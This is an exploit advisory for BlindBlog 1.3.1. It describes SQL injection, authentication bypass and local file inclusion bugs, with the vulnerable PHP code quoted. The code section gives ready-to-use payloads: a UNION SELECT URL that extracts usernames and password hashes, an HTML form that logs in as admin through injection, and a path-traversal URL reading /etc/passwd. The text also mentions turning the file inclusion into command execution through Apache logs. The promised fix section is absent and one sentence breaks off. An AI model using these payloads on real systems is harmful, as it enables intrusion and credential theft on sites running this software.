BlindBlog 1.3.1 (SQL/AB/LFI) Multiple Remote Vulnerabilities
============================================================


*******   Salvatore "drosophila" Fresta   *******

[+] Application: BlindBlog
[+] Version: 1.3.1
[+] Website: http://sourceforge.net/projects/cbblog/

[+] Bugs: [A] SQL Injection
          [B] Authentication Bypass
          [C] Local File Inclusion

[+] Exploitation: Remote
[+] Date: 03 Mar 2009

[+] Discovered by: Salvatore "drosophila" Fresta


*************************************************

[+] Menu

1) Bugs
2) Code
3) Fix


*************************************************

[+] Bugs


- [A] SQL Injection

[-] Requisites: magic_quotes_gpc = off
[-] File affected: comment.php

All queries are vulnerable.
This bug allows a guest to view username and the
password of a registered user.

$id = (isset($_GET[&#039;id&#039;]) && $_GET[&#039;id&#039;] !=&#039;&#039;) ?  $_GET[&#039;id&#039;] : getlastid();

       $SQL = "SELECT comment,author,contact,date FROM `cblog_comments`
WHERE `pid` = &#039;$id&#039; ORDER BY `cid` DESC";
       $resulted = $db->query($SQL, $querys);
       while ($result = mysql_fetch_assoc($resulted))
               $comments[] = $result;


- [B] Authentication Bypass

[-] Requisites: magic_quotes_gpc = off
[-] File affected: admin.login.php

       $username = $_POST[&#039;username&#039;];
       $password = md5($_POST[&#039;password&#039;]);
       include(&#039;./db_config.php&#039;);
       $db = new db_stuff;
       $db->connect();
       $result = $db->query("SELECT * FROM `cblog_users` WHERE `username` =
&#039;$username&#039;", $querys);
       if (mysql_num_rows($result) > 1 || mysql_num_rows($result) < 1)
       {
               echo "Incorrect username";
               exit;
       }
       $result = mysql_fetch_assoc($result);
       if ($result[&#039;password&#039;] !== $password)
       {
               echo &#039;Incorrect Password&#039;;
               exit;
       }


- [C] Local File Inclusion

[-] Requisites: none
[-] File affected: admin.php

This bug allow an admin to include local files.
It is possible bypass authentication using the
With this bug is possible to execute remote
commands using Apache logs.

...
} else if (isset($_GET[&#039;act&#039;]) && $_SESSION[&#039;is_admin&#039;])
{
       $loc = &#039;admin.&#039;.$_GET[&#039;act&#039;].&#039;.php&#039;;
       include(&#039;./&#039;.$loc);
}
...


*************************************************

[+] Code


- [A] SQL Injection

http://www.site.com/path/comment.php?id=-1&#039; UNION ALL SELECT
NULL,CONCAT(username, char(58), password),3,4 FROM cblog_users%23


- [B] Authentication Bypass

<html>
       <head>
               <title>BlindBlog 1.3.1 Authentication Bypass Exploit</title>
       </head>
       <body>
               <form
action="http://www.site.com/path/admin/admin.login.php?go=1"
method="POST">
                       <input type="hidden" name="username" value="-1&#039;
UNION ALL SELECT
1,&#039;admin&#039;,MD5(&#039;expl&#039;)#">
                       <input type="hidden" name="password" value="expl">
                       <input type="submit" value="Exploit">
               </form>
       </body>
</html>


- [C] Local File Inclusion

Tested on MAC OSX: /Applications/xampp/xamppfiles/htdocs/cbblog/admin/admin.php

http://www.site.com/path/admin/admin.php?act=/../../../../../../../etc/passwd%00




